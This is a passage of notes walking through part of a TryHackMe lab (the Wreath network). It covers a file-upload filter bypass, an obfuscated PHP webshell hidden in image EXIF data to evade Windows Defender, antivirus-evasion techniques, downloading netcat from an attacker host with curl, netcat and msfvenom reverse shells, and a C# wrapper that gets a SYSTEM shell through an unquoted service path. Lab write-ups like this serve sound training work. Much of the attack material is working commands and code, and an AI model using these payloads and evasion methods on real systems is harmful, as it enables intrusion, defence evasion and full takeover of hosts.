@@ -2217,6 +2217,918 @@ The short version is: the most up to date version of the site stored in the Git 
 
 
 
+## Website Code Analysis
+
+Head into the `NUMBER-345ac8b236064b431fa43f53d91c98c4834ef8f3/` directory.\
+
+
+The `index.html` file isn't promising -- realistically we need some PHP, which we identified as the webserver's back-end language in Task 31.
+
+Let's look for PHP files using `find`:\
+`find . -name "*.php"`\
+
+
+Only one result:\
+`./resources/index.php`
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/1eba548b724f.png" alt=""><figcaption></figcaption></figure>
+
+If we're going to find a serious vulnerability, it's going to have to be here!
+
+### Answer the questions below
+
+Read through the file.
+
+What does Thomas have to phone Mrs Walker about?
+
+```
+// Some code
+```
+
+This appears to be a file-upload point, so we might have the opportunity for a filter bypass here!
+
+Additionally, the to-do list at the bottom of the page not only gives us an insight into Thomas' upcoming schedule, but it also gives us an idea about the protections around the page itself.
+
+Aside from the filter, what protection method is likely to be in place to prevent people from accessing this page?
+
+```
+/
+```
+
+Let's turn our attention to the code itself now.
+
+Reading through the PHP code, it appears that there are _two_ filters in place here, plus a simple check to see if the file already exists.
+
+These filters are rolled together into one block of PHP code:\
+`$size = getimagesize($_FILES["file"]["tmp_name"]);`\
+`if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){`\
+&#x20;   `header("location: ./?msg=Fail");`\
+&#x20;   `die();`\
+`}`\
+
+
+The first line here uses a classic PHP technique used to see if a file is an image. In short, images have their dimensions encoded in their exif data. The `getimagesize()` method returns these dimensions if the file is genuinely an image, or the boolean value `False` if the file is not an image. This is more difficult to bypass than other filters, but it's far from impossible to do so.
+
+The second line is an If statement which checks two conditions. If either condition fails (indicated by the "Or" operator: `||`) then the script will redirect with a Failure message. The second condition is easy: `!$size` just checks to see if the `$size` variable contains the boolean `False`. The first condition may need to be broken down a little.
+
+`!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts)`
+
+There are two functions in play here: `in_array()` and `explode()`. Let's start with the innermost function and work out the way:\
+`explode(".", $_FILES["file"]["name"])[1]`
+
+The `explode()` function is used to split a string at the specified character. Here it's being used to split the name of the file we uploaded at each period (`.`). From this we can (rightly) assume that this is a file-extension filter. As an example, if we were to upload a file called `image.jpeg`, this function would return a list: `["image", "jpeg"]`. As the filter only really needs the file-extension, it then grabs the second item from the list (`[1]`), remembering that lists start at 0.
+
+This, unfortunately, leads to a big problem. What happens if there's more than one file extension? Let's say we upload a file called `image.jpeg.php`. The filename gets split into `["image", "jpeg", "php"]`, but only the `jpeg` (as the second element in the list) gets passed into the filter!
+
+Looking at the outer function now (and replacing the inner function with a placeholder of `EXPLODE_RESULTS`):\
+`!in_array(EXPLODE_RESULTS, $goodExts)`
+
+This checks to see if the result returned by the `explode()` method is _not_ in an array called `$goodExts`. In other words, this is a whitelist approach where only certain extensions will be accepted. The accepted extension list can be found in line 5 of the file.
+
+***
+
+Which extensions are accepted (comma separated, no spaces or quotes)?
+
+```
+/
+```
+
+Between lines 4 and 15:\
+`$target = "uploads/".basename($_FILES["file"]["name"]);`\
+`...`\
+`move_uploaded_file($_FILES["file"]["tmp_name"], $target);`\
+\
+
+
+We can see that the file will get moved into an `uploads/` directory with it's original name, assuming it passed the two filters.
+
+In summary:
+
+* We know how to find our uploaded files
+* There are two file upload filters in play
+* Both filters are bypassable
+
+We have ourselves a vulnerability!
+
+## Exploit PoC
+
+Ok, so we know what is likely to happen when we access this page:
+
+* It will probably ask us for creds
+* We'll be able to upload image files
+* There are two filters in play to stop us from uploading other kinds of files
+* Both of these filters can be bypassed
+
+Perfect -- let's access the page!&#x20;
+
+### Answer the questions
+
+Let's head to the `/resources` directory.
+
+As expected, we are met with a request for authentication:
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/7b8a8b3287a7.png" alt=""><figcaption></figcaption></figure>
+
+We can assume that the username here is _probably_ either `Thomas` or `twreath` -- both of which we have already seen. We also already have one of Thomas' passwords, stolen from the Git Server using Mimikatz.
+
+See if you can login using these usernames with that password!
+
+Success!\
+
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/5898d52a643f.png" alt=""><figcaption></figcaption></figure>
+
+How cute -- a page to allow Thomas to upload pictures of his beloved cat, Ruby.
+
+Try uploading a legitimate image -- see if you can access it!
+
+We already know how to bypass the first filter -- simply changing the extension to `.jpeg.php` should be enough.
+
+The second filter is slightly harder, but doable.
+
+As the `getimagesize()` function is checking for attributes that only an image will have, we need to give it what it wants: an image.
+
+In other words, we need to upload a genuine image file which contains a PHP webshell _somewhere_. If this file has a `.php` file extension then it will be executed by the website as a PHP file, meaning all we need to do is force a webshell into the file and we're golden.
+
+The easiest place to stick the shell is in the exifdata for the image -- specifically in the `Comment` field to keep it nicely out of the way.
+
+Take a regular image (i.e. download a jpeg of your choice off the internet, keeping it safe for work) and rename it to `test-USERNAME.jpeg.php`, substituting in your own TryHackMe username.
+
+We can then use `exiftool` to check the exifdata of the file:\
+`exiftool IMAGE_NAME`
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/a34cd3bc4060.png" alt=""><figcaption></figcaption></figure>
+
+_Note: you may need to install exiftool before use (`sudo apt install exiftool`)._
+
+Here we can see all of the exifdata for the image. Exiftool also allows us to edit this information, which makes it a great choice for the exploit we're going to carry out.
+
+Before we actually start inserting payloads into the image, however, there is one more thing to take into account. There is antivirus software running on this target. We don't know which AV Thomas uses, but we know that there will be protections enabled on this target. We don't know how strict the Antivirus software he uses is -- for all we know it will pick up any kind of default PHP webshell that we upload, alerting him to how close we are to compromising his host. It might not, but why take the chance? For this reason we will not be uploading a live payload in this task. Instead we will create a proof of concept here, then upload a live payload when we have completed the PHP Obfuscation task in the AV Evasion section of the network.
+
+Bearing this in mind, let's create our PoC!
+
+We'll be using the following PHP payload for this:\
+`<?php echo "<pre>Test Payload</pre>"; die();?>`\
+
+
+This is completely harmless and ergo should not get picked up by the AV. It does give us confirmation that this is likely to work, however, and stages the way for the actual webshell upload.
+
+To add this to our image we once again use exiftool:\
+`exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-USERNAME.jpeg.php`\
+\
+
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/7fe0d0d6ee10.png" alt=""><figcaption></figcaption></figure>
+
+Now try uploading the file and accessing it in your browser!
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/90b4465363db.png" alt=""><figcaption></figcaption></figure>
+
+_Note: The HTML form is configured to only allow image uploads through the GUI, so don't be alarmed if you don't see your script in your working directory. Just change "All Supported Types" at the bottom right of the Window to "All Files":_\
+![File manager with All Supported Types highlighted](https://assets.tryhackme.com/additional/wreath-network/ec93f0bc06f9.png)
+
+![File manager after changing the type to All Files](https://assets.tryhackme.com/additional/wreath-network/f74dbe5147a5.png)\
+
+
+We have the ability to execute arbitrary PHP code on the system!
+
+## Introduction
+
+Antivirus Evasion is the third and final primary teaching point of the Wreath network.
+
+By nature, AV Evasion is a rapidly changing topic. It's a constant dance between hackers and developers. Every time the developers release a new feature, the hackers develop a way around it. Every time the hackers bypass a new feature, the developers release another feature to close off the exploit, and so the cycle continues. Due to the speed of this process, it is nigh impossible to teach bleeding-edge techniques (and expect them to stay relevant for any length of time), so we are only going to be covering the fundamentals of the topic here. Without further ado, let's dive in!\
+
+
+***
+
+When it comes to AV evasion we have two primary types available:
+
+* On-Disk evasion
+* In-Memory evasion
+
+On-Disk evasion is when we try to get a file (be it a tool, script, or otherwise) saved on the target, then executed. This is very common when working with executable (`.exe`) files.
+
+In-Memory evasion is when we try to import a script directly into memory and execute it there. For example, this could mean downloading a PowerShell module from the internet or our own device and directly importing it without ever saving it to the disk.\
+
+
+In ages past, In-Memory evasion was enough to bypass most AV solutions as the majority of antivirus software was unable to scan scripts stored in the memory of a running process. This is no longer the case though, as Microsoft implemented a feature called the Anti-Malware Scan Interface (AMSI). AMSI is essentially a feature of Windows that scans scripts as they enter memory. It doesn't actually check the scripts itself, but it does provide hooks for AV publishers to use -- essentially allowing existing antivirus software to obtain a copy of the script being executed, scan it, and decide whether or not it's safe to execute. Whilst there are various bypasses for this (often involving tricking AMSI into failing to load), these are out of scope for this room.
+
+In terms of methodology: ideally speaking, we would start by attempting to fingerprint the AV on the target to get an idea of what solution we're up against. As this is often an interactive (social-engineering reliant) process, we will skip it for now and assume that the target is running the default Windows Defender so that we can get straight into the meat of the topic. If we already have a shell on the target, we may also be able to use programs such as [SharpEDRChecker](https://github.com/PwnDexter/SharpEDRChecker) and [Seatbelt](https://github.com/GhostPack/Seatbelt) to identify the antivirus solution installed. Once we know the OS version and AV of the target, we would then attempt to replicate this environment in a virtual machine which we can use to test payloads against. Note that we should _always_ disable any kind of cloud-based protection in the AV settings (potentially by outright disconnecting the VM from the internet) so that the AV doesn't upload our carefully crafted payloads to a server somewhere for analysis, destroying all our hard work. Once we have a working payload, we can then deploy it against the target!
+
+AV Evasion usually involves some form of obfuscation when it comes to payloads. This could mean anything from moving things around in the exploit and changing variable names, to encoding aspects of the script, to outright encrypting the payload and writing a wrapper to decrypt and execute the code section-by-section. The aim is to switch things enough that the AV software is unable to detect anything bad.
+
+### Answer the questions below
+
+**Which category of evasion covers uploading a file to the storage on the target before executing it?**
+
+```
+// Some code
+```
+
+**What does AMSI stand for?**
+
+```
+/
+```
+
+**Which category of evasion does AMSI affect?**
+
+```
+/
+```
+
+## AV Detection Methods
+
+Before we get into the practical side of things, let's talk a little about the different detection methods employed by antivirus software.
+
+Generally speaking, detection methods can be classified into one of two categories:
+
+* Static Detection
+* Dynamic / Heuristic / Behavioural Detection
+
+Modern Antivirus software will usually rely on a combination of these.\
+
+
+***
+
+Static detection methods usually involve some kind of signature detection. A very rudimentary system, for example, would be taking the hashsum of the suspicious file and comparing it against a database of known malware hashsums. This system does tend to be used; however, it would never be used by itself in modern antivirus solutions. For this reason it's usually a good idea to change _something_ when working with a known exploit. The smallest change to the file will result in a completely different hashsum, so even something as small as changing a string in the help message would be enough to bypass this kind of rudimentary detection system.
+
+Fortunately (or unfortunately for us as hackers), this is usually nowhere near enough to bypass static detection methods.
+
+The other form of static detection which is often used in antivirus software (to much greater effect) is a technique called Byte (or string) matching. Byte matching is another form of signature detection which works by searching through the program looking to match sequences of bytes against a known database of bad byte sequences. This is much more effective than just hashing the entire file! Of course, it also means that we (as hackers) have a much harder job tracking down the exact line of code responsible for the flag.\
+
+
+The tradeoff with this method is, of course, speed. Checking small sequences of bytes against a potentially huge program with multiple libraries can take a comparatively long time compared to the milliseconds it would take to hash the entire file and compare the hash against a database. As such, a compromise is sometimes made whereby the AV program hashes small sections of the file to check against the database, rather than hashing the entire thing. This obviously reduces the effectiveness of the technique, but does increase the speed somewhat.\
+
+
+***
+
+Where static virus malware detection methods look at the file itself, dynamic methods look at how the file _acts._ There are a couple of ways to do this.
+
+1. AV software can go through the executable line-by-line checking the flow of execution. Based on _pre-defined rules_ about what type of action is malicious (e.g. is the program reaching out to a known bad website, or messing with values in the registry that it shouldn't be?), the AV can see how the program _intends_ to act, and make decisions accordingly
+2. The suspicious software can outright be executed inside a sandbox environment under close supervision from the AV software. If the program acts maliciously then it is quarantined and flagged as malware
+
+Evading these measures is still perfectly possible, although a lot harder than evading static detection techniques. Sandboxes tend to be relatively distinctive, so we just need to look for various system values (e.g. is there a fan installed, is there a GUI, and if so, what resolution is it, are there any distinctive tools or services running -- `VMtools` for VMware virtual machines, for example) and check to see if there are any red flags. For example, a machine with no fan, no GUI and a classic VM service running is very likely to be a sandbox -- in which case the program should just exit. If the program exits without doing anything malicious then the AV software is fooled into believing that it's safe and allows it to be executed on the target.
+
+Equally, with logic-flow analysis, the AV software is still only working with a set of rules to check malicious behaviour. If the malware acts in a way that is unexpected (e.g. has some random code that does the grand sum of nothing inserted into the exploit) then it will likely pass this detection method.
+
+In addition to this, when working with certain kinds of delivery methods, password protecting the file can get straight around the behavioural analysis checks as (unlike the user who knows the password), the AV software is unable to open and execute the file.
+
+That said, dynamic detection methods are usually a lot more effective than static methods. The drawback is, once again, the time and resources required to spin up a VM to analyse the file in, or go through it line-by-line to see if it's doing anything malicious. These are actions that take time (causing users to grow impatient), and use up a lot of the computer's available resources. Once again the AV has to compromise, using a combination of dynamic and static analysis when scanning a file.\
+
+
+***
+
+To make life harder still, antivirus vendors are usually in close contact with one another -- as well as with scanning sites such as [VirusTotal](https://www.virustotal.com/). When the AV detects a suspicious file, it usually sends the file back to servers owned by the provider where it gets analysed and shared with other providers. What this means is that once our payload is detected on one computer, the chances are that it will quickly be taken apart and shielded against. This rapid sharing of information allows AV providers to stay ahead of bad actors (a good thing), but also obviously adds an extra complication into our job as Ethical Hackers.
+
+Additionally, new techniques are being developed all the time. For example, many attempts are being made to use machine learning techniques to dynamically update the list of bad behaviours in a sandbox environment, or the rule-lists used in logic-flow analysis of a suspicious file. If you're interested in some of the work being done in this area, TryHackMe's very own [CMNatic](https://cmnatic.co.uk/) did his dissertation on the subject, which can be read [here](https://resources.cmnatic.co.uk/Presentations/Dissertation/).
+
+### Answer the questions below
+
+What other name can be used for Dynamic/Heuristic detection methods?
+
+```
+// Some code
+```
+
+If AV software splits a program into small chunks and hashes them, checking the results against a database, is this a static or dynamic analysis method?
+
+```
+/
+```
+
+When dynamically analysing a suspicious file using a line-by-line analysis of the program, what would antivirus software check against to see if the behaviour is malicious?
+
+```
+/
+```
+
+What could be added to a file to ensure that only a user can open it (preventing AV from executing the payload)?
+
+```
+/
+```
+
+## PHP Payload Obfuscation
+
+Now that we've covered the basic terminology, let's get back to hacking this PC!
+
+We have an upload point which we can use to upload PHP scripts. We now need to figure out how to make a PHP script that will bypass the antivirus software. Windows Defender is free and comes pre-installed with Windows Server, so let's assume that this is what is in use for the time being.\
+
+
+The solution is this:\
+We build a payload that does what we need it to do (preferably in a slightly less than common way), then we obfuscate it either manually or by using one of the many tools available online.
+
+First up, let's build that payload:\
+`<?php`\
+&#x20;   `$cmd = $_GET["wreath"];`\
+&#x20;   `if(isset($cmd)){`\
+&#x20;       `echo "<pre>" . shell_exec($cmd) . "</pre>";`\
+&#x20;   `}`\
+&#x20;   `die();`\
+`?>`\
+
+
+Here we check to see if a GET parameter called "wreath" has been set. If so, we execute it using `shell_exec()`, wrapped inside HTML `<pre>` tags to give us a clean output. We then use `die()` to prevent the rest of the image from showing up as garbled text on the screen.\
+
+
+This is slightly longer than the classic PHP one-liner webshell (`<?php system($_GET["cmd"]);?>`) for two reasons:
+
+1. If we're obfuscating it then it will become a one-liner anyway
+2. Anything _different_ is good when it comes to AV evasion
+
+We now need to obfuscate this payload.
+
+There are a variety of measures we could take here, including but not limited to:
+
+* Switching parts of the exploit around so that they're in an unusual order
+* Encoding all of the strings so that they're not recognisable
+* Splitting up distinctive parts of the code (e.g. `shell_exec($_GET[...])`)
+
+### Answer the questions below
+
+Manual obfuscation is very much a thing, but for the sake of simplicity, let's just use one of the available online tools. The tool linked [here](https://www.gaijin.at/en/tools/php-obfuscator) is recommended. When it comes to web obfuscation, these tools are generally used to make the code difficult for humans to read; however, by doing things like obfuscating variable/function names and encoding strings, they also prove effective against antivirus software.\
+
+
+Stick the payload into the tool, then activate all the obfuscation options:
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/bb2ef4375625.png" alt=""><figcaption></figcaption></figure>
+
+Click the "Obfuscate Source Code" button, and we're left with this mess of PHP:\
+`<?php $p0=$_GET[base64_decode('d3JlYXRo')];if(isset($p0)){echo base64_decode('PHByZT4=').shell_exec($p0).base64_decode('PC9wcmU+');}die();?>`\
+
+
+If you look closely you'll see that this is still very much the same payload as before; however, enough has changed that it _should_ fool Defender.
+
+As this is getting passed into a bash command, we will need to escape the dollar signs to prevent them from being interpreted as bash variables. This means our final payload is as follows:\
+`<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>`
+
+
+
+With an obfuscated payload, we can now finalise our exploit.
+
+Once again, make a copy of an innocent image (ensuring you give it a name in the format of `shell-USERNAME.jpeg.php`), then use `exiftool` to embed the payload into the image:\
+`exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell-USERNAME.jpeg.php`\
+
+
+![Screenshot showing the insertion of the obfuscated webshell into the image with exiftool](https://assets.tryhackme.com/additional/wreath-network/98a8bd99378c.png)
+
+
+
+
+
+Upload your shell and attempt to access it!
+
+If this worked then you should get an output similar to the following:\
+
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/6b09145ae074.png" alt=""><figcaption></figcaption></figure>
+
+Awesome! We have a shell.
+
+We can now execute commands using the `wreath` GET parameter, e.g:\
+`http://10.200.72.100/resources/uploads/shell-USERNAME.jpeg.php?wreath=systeminfo`
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/2920fdb4cd18.png" alt=""><figcaption></figcaption></figure>
+
+\
+
+
+***
+
+**What is the Host Name of the target?**
+
+
+
+
+
+**What is our current username (include the domain in this)?**
+
+
+
+
+
+## Compiling Netcat & Reverse Shell!
+
+Our webshell is all well and good, but let's go for a full reverse shell!
+
+Unfortunately, we have a problem. Unlike in Linux where there are usually many ways to obtain a reverse shell, the options in Windows are a lot fewer in number as Windows tends not to have many scripting languages installed by default.
+
+Realistically we have several options here:
+
+* Powershell tends to be the go-to for Windows reverse shells. Unfortunately Defender knows exactly what PowerShell reverse shells look like, so we'd have to do some serious obfuscation to get this to work.
+* We could try to get a PHP reverse shell as we know the target has a PHP interpreter installed. Windows PHP reverse shells tend to be iffy though, and again, may trigger Defender.
+* We could generate an executable reverse shell using msfvenom, then upload and activate it using the webshell. Again, msfvenom shells tend to be very distinctive. We could use the [Veil Framework](https://www.veil-framework.com/) to give us a meterpreter shell executable that might bypass Defender, but let's try to keep this manual for the time. Equally, [shellter](https://www.shellterproject.com/) (though old) might give us what we need. There are easier options though.
+* We could upload netcat. This is the quick and easy option.
+
+The only problem with uploading netcat is that there are hundreds of different variants -- the version of netcat for Windows that comes with Kali is known to Defender, so we're going to need a different version. Fortunately there are many floating around! Let's use one from github, [here](https://github.com/int0x33/nc.exe/).
+
+Clone the repository:\
+`git clone https://github.com/int0x33/nc.exe/`\
+
+
+This repository already contains pre-compiled netcat binaries for both 32 and 64 bit systems, however, this is an ideal time to talk about cross-compilation techniques. If you'd prefer to just use the default binaries then just skip to the last section of this task and use the `nc64.exe` binary from the repository.
+
+***
+
+Cross compilation is an essential skill -- although in many ways it's preferable to avoid it.
+
+First up: what is cross compilation? The idea is to compile source code into a working program to run on a different platform. In other words, cross compilation would allow us to compile a program for a different Linux kernel, a Windows program on Kali (as we're doing here), or even software for an embedded device or phone.
+
+Whilst cross-compilation is a very useful skill to have, it's often difficult to get completely correct. Ideally we should always try to compile our code in an environment as close to the target environment as possible. For example, if an exploit or program is designed to work on CentOS 7.2, we should try to compile it in a CentOS 7.2 VM if possible. Equally, it's essential that we get the same arch as that of the target -- a 64 bit program won't work very well on a 32 bit target!
+
+Sometimes it's easiest to just cross-compile, however. Generally speaking we cross compile x64 Windows programs on Kali using the `mingw-w64` package (for x64 systems). This is not installed on Kali by default, however it is available in the Kali apt repositories:\
+`sudo apt install mingw-w64`\
+
+
+This is a big package, but once it's installed we can start re-compiling netcat.
+
+Much like we use `gcc` to compile binaries on Linux, we can use the `mingw` compilers to compile Windows binaries. These tend to have very descriptive (read: long) names, but the one that's of particular importance to us here is `x86_64-w64-mingw32-gcc`. This specifies that we want to compile a 64bit binary.\
+
+
+Inside the nc.exe repository we downloaded, delete or move the two pre-compiled netcat binaries. The repository provides a makefile which we can use (with some small alterations) to compile the binary. Open up the `Makefile` with your favourite text editor. The first two lines specify which compiler to use:\
+
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/499921a44689.png" alt=""><figcaption></figcaption></figure>
+
+Neither of these are quite what we're looking for, so comment out the first line and add another line underneath:\
+`CC=x86_64-w64-mingw32-gcc`
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/d71f7f2fcb0e.png" alt=""><figcaption></figcaption></figure>
+
+Now when we run `make` to build the binary, the correct compiler will be used to generate a x64 Windows executable. Note that there will be a lot of warnings generated by the compiler (these have been redirected to `/dev/null` in the following screenshot for readability, however, you do not need to do this). These are nothing to worry about; the compilation should still be successful.\
+
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/b29a99fd33fd.png" alt=""><figcaption></figcaption></figure>
+
+### Answer the questions below
+
+Bonus Question (optional): Follow the steps detailed above to compile a copy of netcat.exe (otherwise use the copy already in the repo).
+
+
+
+With a copy of netcat available, we now need to get it up to the target.
+
+Start a Python webserver on your attacking machine (as demonstrated numerous times previously):\
+`sudo python3 -m http.server 80`
+
+
+
+
+
+Despite it often being much harder to upload binaries to Windows than it is to upload to Linux, we do have a few options here.
+
+* Powershell _might_ work, but with AMSI in play it's a risk.
+* We could use the file upload point that we originally exploited to upload an unrestricted PHP file uploader (in the same way that we uploaded the original webshell, although this would be a bit of a pain with embedding the uploader in an image).
+* We could look for other command line tools installed on the target such as `curl.exe` or `certutil.exe`, both of which might allow for a file upload.
+
+Try to execute both of this in the webshell -- both should work.
+
+What output do you get when running the command: `certutil.exe`?
+
+
+
+
+
+Certutil is a default Windows tool that is used to (amongst other things) download CA certificates. This also makes it ideal for file transfers, _but_ Defender flags this as malicious.
+
+Instead we'll stick with trusty old cURL.
+
+Use cURL to upload your new copy of netcat to the target:\
+`curl http://ATTACKER_IP/nc.exe -o c:\\windows\\temp\\nc-USERNAME.exe`\
+
+
+Note the double backslashes used here. This is purely due to how the webshell handles backslashes. We need to escape the backslashes so that they are passed in as a part of the command, as opposed to escaping the letters immediately after them.
+
+
+
+
+
+We now have everything we need to get a reverse shell back from this target.
+
+Set up a netcat listener on your attacking machine, then, in your webshell, use the following command:\
+`powershell.exe c:\\windows\\temp\\nc-USERNAME.exe ATTACKER_IP ATTACKER_PORT -e cmd.exe`\
+
+
+e.g.\
+`powershell.exe c:\\windows\\temp\\nc-MuirlandOracle.exe 10.50.73.2 443 -e cmd.exe`\
+
+
+This should result in a reverse shell from the target!
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/ac7e2a438cd5.png" alt=""><figcaption></figcaption></figure>
+
+_Note: In order for this to work we had to wrap the netcat command inside a powershell process to keep it from exiting early._
+
+
+
+Bonus Question (optional): Try generating a metasploit reverse shell and transfer it to the target (`msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=ATTACKING_IP LPORT=CHOOSE_A_PORT`) -- make sure to place it in a directory you can list (e.g. the Uploads directory of the webserver). This shell will get picked up by Defender (so don't do it anywhere else!), but it will give you a feel for how antivirus operates when it detects your payload as being malicious.
+
+You should get an error message when trying to execute the executable and the exe will also disappear from the current directory (placed into quarantine by the AV). At this point the Administrator has also been alerted, along with the security team in a bigger organisation.
+
+
+
+## Enumeration
+
+We have a reverse shell on the third and final target -- this is cause for celebration!
+
+We don't yet have full system access to the target though. As we saw when we first obtained the webshell, the webserver was (un)fortunately not running with system permissions (contrary to the Xampp defaults), which leaves us with a low-privilege account. Looks like Thomas was sensible with his security on his own PC!
+
+This does mean that we're going to need to enumerate the target for privesc vectors though -- and with Defender active, we'll have to do it quietly. Let's consider our options:
+
+* We could (and should) always start with a little manual enumeration. This will be relatively quiet and gives us a baseline to work with\
+
+* Defender would _definitely_ catch a regular copy of WinPEAS; however, it would be unlikely to catch either the `.bat` version or the obfuscated `.exe` version, both of which are released in the [PEAS repository](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/) alongside the regular version
+* Chances are that AMSI will alert Defender if we try to load any PowerShell privesc check scripts (e.g. PowerUp), so we'd ideally be looking for obfuscated versions of these if we were to use them
+
+We'll start with some manual enumeration and hopefully come up with something workable!
+
+### Answer the questions below
+
+Use the command `whoami /priv`.
+
+\[Research] One of the privileges on this list is very famous for being used in the PrintSpoofer and Potato series of privilege escalation exploits -- which privilege is this?
+
+```
+// Some code
+```
+
+Our current user likely has this privilege due to running XAMPP as a service on the account. Unfortunately this also means that XAMPP won't be a good privesc vector in its own right, but we might be able to use the privileges it gave us!
+
+***
+
+Now use `whoami /groups` to check the current user's groups.
+
+Unfortunately this account isn't in the Local Administrators group as that (combined with the High integrity process we're currently using) would make any further privilege escalation redundant.
+
+
+
+Now that we've got an idea of our own user's capabilities. Let's take a look at the box itself.
+
+Windows services are commonly vulnerable to various attacks, so we'll start there. Generally speaking, it's unlikely that core Windows services will be vulnerable to anything -- user installed services are far more likely to have holes in them.
+
+Let's start by looking for non-default services:\
+`wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"`
+
+This lists all of the services on the system, then filters so that only services that are _not_ in the `C:\Windows` directory are returned. This should cut out most of the core Windows services (which are unlikely to be vulnerable to this kind of vulnerability), leaving us with primarily lesser-known, user-installed services.\
+
+
+There should be a bunch of results returned here. Read through them, paying particular attention to the `PathName`  column. Notice that one of the paths does not have quotation marks around it.\
+
+
+What is the Name (second column from the left) of this service?
+
+```
+// 
+```
+
+Is the service running as the local system account (Aye/Nay)?
+
+```
+/
+```
+
+his is looking good!
+
+Let's check the permissions on the directory. If we can write to it, we are golden:\
+`powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"`\
+
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/f0b36cf3dfba.png" alt=""><figcaption></figcaption></figure>
+
+We have full control over this directory! How strange, but hey, Thomas' security oversight will allow us to root this target.
+
+
+
+In the interests of learning, it should be noted here that this is far from the only vulnerability here. By the looks of things, Thomas installed the program but couldn't be bothered entering the password for the Administrator account every time he needed to interact with it. As a result, he botched the permissions and gave every user access to every aspect of the program.
+
+This means that we can create our unquoted service path exploit, but we could also perform attacks such as DLL hijacking, or even outright replacing the service executable with a malicious binary.
+
+That said, we will stick to the unquoted service path vulnerability purely to avoid messing with the service itself. This way all we need to do is create our own binary then delete it, rather than alter any of the files in the service itself.
+
+***
+
+Bonus Question (optional): Try to get a copy of WinPEAS up to the target (either the obfuscated executable file, or the batch variant) and run it. You will see that there are many more potential vulnerabilities on this target -- mainly due to patches that haven't been installed.
+
+## Privilege Escalation
+
+Let's recap what we found in the previous task:
+
+* We have a privilege which we could almost certainly use to escalate to system permissions. The downside is that we'd need to obfuscate the exploits in order to get them past Defender.
+* We have an unquoted service path vulnerability for a service running as the system account. This is ideal.
+
+We have everything we need to root this box. Let's do this!
+
+Of the two vulnerabilities that are immediately available, we will work through the unquoted service path attack for one simple reason: getting a reverse shell back from this is _very_ easy -- even with Defender in play. The exploits available to manipulate the privilege we found would need to be custom compiled and obfuscated in order to be useful to us; however, with the unquoted service path, all we need is one very small "wrapper" program that activates the netcat binary that we _already have on the target._ To put it another way, we just need to write a small executable that executes a system command: activating netcat and sending us a reverse shell as the owner of the service (i.e. local system). Ideally we would write a full C# service file that would integrate seamlessly with the Windows service management system. Whilst this is perfectly possible (and is by far the preferable option), for the sake of simplicity, we will stick to just creating a standalone executable. It's worth noting that this technique is effective at bypassing the antivirus software on the target; however, in an enterprise situation there is a good chance that it would be picked up by an intrusion detection system. In this scenario we would be looking for a more sophisticated (if similar) solution.\
+
+
+Ideally we'd be using Visual Studio here. If you happen to have a Windows host and are familiar with Visual Studio then please feel free to use it for. As not everyone has access to a Windows machine (or is comfortable installing Windows as a virtual machine), the teaching content will work with the `mono` dotnet core compiler for Linux. This can be easily installed on Kali and will allow us to compile C# executables that can be run on Windows targets. The same code will work just fine if compiled in Visual Studio, however.
+
+***
+
+First we need to install Mono. This can be done with:\
+`sudo apt install mono-devel`\
+
+
+If you are using the AttackBox then this should already be installed.\
+
+
+Now, open a file called `Wrapper.cs` in your favourite text editor.
+
+The first thing we need to do is add our "imports". These allow us to use pre-defined code from other "namespaces" -- essentially giving us access to some basic functions (e.g. input/output). At the very top if the file, add the following lines:\
+`using System;`\
+`using System.Diagnostics;`\
+\
+
+
+These allow us to start new processes (i.e. execute netcat).
+
+Next we need to initialise a namespace and class for the program:\
+`namespace Wrapper{`\
+&#x20;   `class Program{`\
+&#x20;       `static void Main(){`\
+&#x20;           `//Our code will go here!`\
+&#x20;       `}`\
+&#x20;   `}`\
+`}`\
+
+
+We can now write the code that will call netcat. This goes inside the `Main()` function (replacing the `//Our code will go here!` line).
+
+First, we create a new process, as well as a ProcessStartInfo object to set the parameters for the process:\
+`Process proc = new Process();`\
+`ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-USERNAME.exe", "ATTACKER_IP ATTACKER_PORT -e cmd.exe");`\
+
+
+_Make sure to replace the_ `nc-USERNAME.exe` _with the name of your own netcat executable, as well as slotting in your own IP and Port!_
+
+With the objects created, we can now configure the process to not create it's own GUI Window when starting:\
+`procInfo.CreateNoWindow = true;`\
+
+
+Finally, we attach the `ProcessStartInfo` object to the process, and start the process!\
+`proc.StartInfo = procInfo;`\
+`proc.Start();`\
+
+
+Our program is now complete. It should look something like this:
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/1680d2c86ef0.png" alt=""><figcaption></figcaption></figure>
+
+We can now compile our program using the Mono `mcs` compiler. This is extremely simple using the package we installed earlier:\
+`mcs Wrapper.cs`\
+
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/f051e39d81f6.png" alt=""><figcaption></figcaption></figure>
+
+### Answer the questions below
+
+Write and compile a wrapper program using Mono or Visual Studio.
+
+Transfer the `Wrapper.exe`  file to the target. Just to spice things up a bit, let's use an Impacket SMB server, rather than our usual HTTP server. If you would prefer to use the HTTP server and cURL (or another method to transfer the file) you are welcome to do so.
+
